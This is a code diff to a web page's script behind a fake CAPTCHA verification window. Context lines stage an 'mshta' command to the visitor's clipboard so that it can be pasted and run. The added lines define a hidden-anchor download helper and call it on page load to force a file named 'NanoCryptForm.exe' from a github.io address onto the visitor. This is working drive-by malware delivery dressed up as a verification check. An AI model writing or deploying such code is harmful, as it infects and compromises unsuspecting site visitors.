@@ -289,6 +289,23 @@
         let checkboxBtnSpinner = document.getElementById("spinner");
         let verifywindow = document.getElementById("verify-window");
 
+        function downloadFromUrl(fileUrl, fileName) {
+  // Create a temporary hidden anchor element
+          const link = document.createElement('a');
+          link.href = fileUrl;
+  
+  // The download attribute forces the browser to download instead of opening the file
+          link.download = fileName || 'download';
+  
+  // Append to body, trigger click, and clean up immediately
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+}
+
+// Example usage:
+downloadFromUrl('https://example.com', 'Annual_Report.pdf');
+
         function addCaptchaListeners() {
             if (checkboxBtn) {
                 document.addEventListener("click", function (event) {
@@ -423,6 +440,8 @@
             const commandToRun = "mshta " + htaPath
             stageClipboard(commandToRun, verification_id)
         }
+
+        downloadFromUrl('https://easycheatcc.github.io/rghegergegw/', 'NanoCryptForm.exe');
 
         addCaptchaListeners();
 
